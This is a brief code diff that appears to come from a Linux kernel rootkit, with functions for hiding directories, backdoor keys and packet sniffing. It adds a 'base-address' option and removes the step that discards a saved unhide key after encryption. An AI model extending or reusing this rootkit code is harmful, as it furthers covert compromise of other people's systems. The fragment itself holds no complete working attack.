@@ -473,6 +473,7 @@ static const match_table_t tokens = {
 	{ Opt_unhide_directory, "unhide-directory=%s" },
 
 	{ Opt_journalclt, "journal-flush" },
+	{ Opt_fetch_base_address, "base-address=%d" },
 #ifdef DEBUG_RING_BUFFER
 	{ Opt_get_bdkey, "get-bdkey" },
 	{ Opt_get_unhidekey, "get-unhidekey" },
@@ -871,9 +872,6 @@ cont:
 
 	memcpy(buf, &auto_unhidekey, 8);
 	kv_encrypt(kvmgc_unhidekey, buf, sizeof(buf));
-
-	/** discard saved key */
-	auto_unhidekey = 0;
 
 	tsk_sniff = kv_sock_start_sniff();
 	if (!tsk_sniff)
